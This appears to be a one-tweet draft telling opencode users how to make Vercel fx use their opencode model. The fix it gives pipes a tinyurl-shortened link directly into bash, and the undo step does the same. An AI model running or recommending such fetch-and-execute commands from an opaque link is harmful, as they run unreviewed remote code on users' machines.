# X thread — 1 tweet for opencode users who tried fx (<280)

Have $10 opencode and tried Vercel fx? fx ignores `BASE_URL` to opencode. Fix: `curl -fsSL https://tinyurl.com/283mqya5 | bash` → `fx` now uses your opencode model (check `fx status`). Undo: `curl -fsSL https://tinyurl.com/283mqya5 | bash -s unpatch`. Bridge until fx is native.
